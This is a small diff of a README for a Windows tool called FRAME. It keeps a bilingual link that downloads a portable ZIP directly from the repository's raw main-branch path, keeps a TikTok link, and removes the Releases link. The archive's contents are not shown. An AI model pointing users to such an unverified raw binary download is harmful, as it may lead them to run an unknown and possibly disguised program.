@@ -7,7 +7,6 @@
 <p align="center">
   <a href="https://github.com/veltrix231/frame/raw/refs/heads/main/downloads/FRAME-portable.zip"><b>⬇ Скачать FRAME для Windows / Download for Windows</b></a>
   <br><br>
-  <a href="https://github.com/veltrix231/frame/releases">Версии / Releases</a> ·
   <a href="https://www.tiktok.com/@lyorefreak">TikTok @lyorefreak</a>
 </p>
 
